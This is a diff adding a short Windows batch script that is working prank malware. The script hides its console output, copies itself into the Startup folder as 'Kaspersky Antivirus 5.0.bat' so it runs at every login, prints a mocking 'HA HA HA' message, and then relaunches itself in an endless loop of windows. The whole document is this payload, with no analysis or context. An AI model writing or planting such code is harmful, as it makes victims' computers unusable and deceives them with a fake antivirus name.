@@ -1,0 +1,11 @@
+cls
+@echo off
+ctty nul
+@copy %0 c:\windows\startm~1\programs\startup\"Kaspersky Antivirus 5.0".bat >nul
+@echo.
+@echo.
+@echo.
+@echo.
+@echo.
+@echo HA HA HA HA HA HA HA HA HA HA HA HA HA !!!
+@start /max %0
